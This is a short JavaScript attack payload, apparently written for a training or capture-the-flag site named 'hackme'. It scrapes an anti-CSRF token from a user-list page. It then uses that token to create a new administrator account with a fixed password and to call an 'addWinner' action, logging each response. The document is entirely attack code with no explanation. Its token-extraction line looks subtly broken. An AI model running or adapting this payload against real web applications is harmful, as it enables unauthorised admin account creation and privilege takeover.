function test(pagename){
var req = null;
try { req = new XMLHttpRequest(); } catch(e) {}
if (!req) try { req = new ActiveXObject("Msxml2.XMLHTTP"); } catch(e) {}
if (!req) try { req = new ActiveXObject("Microsoft.XMLHTTP"); } catch(e) {}
req.open('GET', 'http://hackme.groupinfra.com/'+pagename+'/pages/listUsers', false);
req.send(null);
var validatingUuid = req.responseText.substring(req.responseText.indexOf('name=\"validatingUuid\" value=\"'),37);
console.log("VK1." + req.responseText);
if(req.responseText){
//var validatingUuid = $(req.responseText).add("[name='validatingUuid']")[0].value;
console.log("VK2." + validatingUuid);
//if(validatingUuid){
//var validatingUuidValue = $("[name='validatingUuid']")[0].value;
//console.log("3." + validatingUuidValue);
req.open('GET', 'http://hackme.groupinfra.com/'+pagename+'/pages/saveUser?name=kriegerv&password=toto&admin=true&id=-1&validatingUuid='+ validatingUuid, false);
req.send(null);
console.log("VK4." + req.responseText);
req.open('GET', 'http://hackme.groupinfra.com/'+pagename+'/pages/addWinner?name=kriegerv&validatingUuid='+ validatingUuid, false);
req.send(null);
console.log("VK5." + req.responseText);
//}
}
}
test("luke");
